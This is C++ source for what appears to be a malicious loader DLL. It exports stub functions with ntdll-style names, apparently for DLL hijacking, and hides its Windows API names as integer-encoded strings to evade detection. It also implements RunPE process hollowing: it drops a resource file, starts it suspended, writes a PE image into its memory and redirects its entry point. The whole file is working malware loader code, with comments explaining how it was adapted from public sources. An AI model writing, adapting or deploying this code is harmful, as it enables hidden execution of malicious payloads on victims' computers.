...
// Required Imports
// I started coding using the static imports and later changed to dynamic ones
...
// I will leave it here in case some1 wants to add dead code to it
#include<commctrl.h>
...
extern "C" { __declspec(dllexport) void KiFastSystemCallRet() { return; }}
extern "C" { __declspec(dllexport) void KiIntSystemCall() { return; }}
extern "C" { __declspec(dllexport) void LdrWx86FormatVirtualImage() { return; }}
extern "C" { __declspec(dllexport) void NtWow64AllocateVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CallFunction64(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrAllocateCaptureBuffer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrAllocateMessagePointer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrCaptureMessageBuffer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrCaptureMessageString(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrClientCallServer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrClientConnectToServer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrFreeCaptureBuffer(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrGetProcessId(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrIdentifyAlertableThread(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64CsrVerifyRegion(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64DebuggerCall(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64GetCurrentProcessorNumberEx(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64GetNativeSystemInformation(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64QueryInformationProcess64(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64QueryVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64ReadVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void NtWow64WriteVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void RtlCaptureStackContext(){ return; }}
extern "C" { __declspec(dllexport) void RtlExtendedIntegerMultiply(){ return; }}
extern "C" { __declspec(dllexport) void RtlExtendedLargeIntegerDivide(){ return; }}
extern "C" { __declspec(dllexport) void RtlExtendedMagicDivide(){ return; }}
extern "C" { __declspec(dllexport) void RtlFillMemoryUlong(){ return; }}
extern "C" { __declspec(dllexport) void RtlFillMemoryUlonglong(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerAdd(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerArithmeticShift(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerDivide(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerNegate(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerShiftLeft(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerShiftRight(){ return; }}
extern "C" { __declspec(dllexport) void RtlLargeIntegerSubtract(){ return; }}
extern "C" { __declspec(dllexport) void RtlUlonglongByteSwap(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64AllocateVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CallFunction64(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrAllocateCaptureBuffer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrAllocateMessagePointer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrCaptureMessageBuffer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrCaptureMessageString(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrClientCallServer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrClientConnectToServer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrFreeCaptureBuffer(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrGetProcessId(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrIdentifyAlertableThread(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64CsrVerifyRegion(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64DebuggerCall(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64GetCurrentProcessorNumberEx(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64GetNativeSystemInformation(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64QueryInformationProcess64(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64QueryVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64ReadVirtualMemory64(){ return; }}
extern "C" { __declspec(dllexport) void ZwWow64WriteVirtualMemory64(){ return; }}
...
int resthreadenc[] ={82,101,115,117,109,101,84,104,114,101,97,100,0};
int getmodfilenameaenc[] ={71,101,116,77,111,100,117,108,101,70,105,108,101,78,97,109,101,65,0};
int getthreadcontenc[] ={71,101,116,84,104,114,101,97,100,67,111,110,116,101,120,116,0};
int setthreadcontenc[] ={83,101,116,84,104,114,101,97,100,67,111,110,116,101,120,116,0};
int readprocmemenc[] ={82,101,97,100,80,114,111,99,101,115,115,77,101,109,111,114,121,0};
int writeprocmemenc[] ={87,114,105,116,101,80,114,111,99,101,115,115,77,101,109,111,114,121,0};
int virtallocenc[] ={86,105,114,116,117,97,108,65,108,108,111,99,0};
int virtallocexenc[] ={86,105,114,116,117,97,108,65,108,108,111,99,69,120,0};
...
BOOL APIENTRY DllMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved ){
   ...
   switch ( ul_reason_for_call )
   {
      ...
      case DLL_PROCESS_ATTACH:
		  ...
		  gmfn = (MyGetModuleFileNameA)GetProcAddress(k32,decode(getmodfilenameaenc,19));
...
// name of the dropped file in an encoded fashion
int dummyenc[] ={104,101,108,108,111,46,101,120,101,0};
#define DUMMY_NAME decode(dummyenc,10)

// Injection Method
// You can find this method in multiple githubs out there
// Particularly adapted from these:
...
int RunPortableExecutable(void* Image)
{
	...
	gmfn(0, CurrentFilePath, 1024); // path to current executable
	...
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		...
		// the original version creates a copy of itself
		//if (cp(CurrentFilePath, NULL, NULL, NULL, FALSE,
		// I modified here to launch the dropped payload
		if (cp(DUMMY_NAME, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
			//process in suspended state, for the new image.
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(va(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (gtc(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				// Read instructions
				rpm(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				pImageBase = vaex(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				// Write the image to the process
				wpm(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
					
					wpm(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				wpm(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
				
				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				stc(PI.hThread, LPCONTEXT(CTX)); // Set the context
				rt(PI.hThread); //´Start the process/call main()
...
// Launch the process with the payload injected in memory
// I kept the launch name for compatibility with previous version
// in practice it is only a warpper for the RunPE method
...
void run(HANDLE hModule)
{
	...
	// drop dummy
	// Locate Resource
	HRSRC r1 = frw(h,MAKEINTRESOURCE(IDR_BIN2),MAKEINTRESOURCE(BIN));
	HGLOBAL rc1 = mlr(h,r1);
	void* data1 = mlor(rc1);
	DWORD size1 = sor(h,r1);
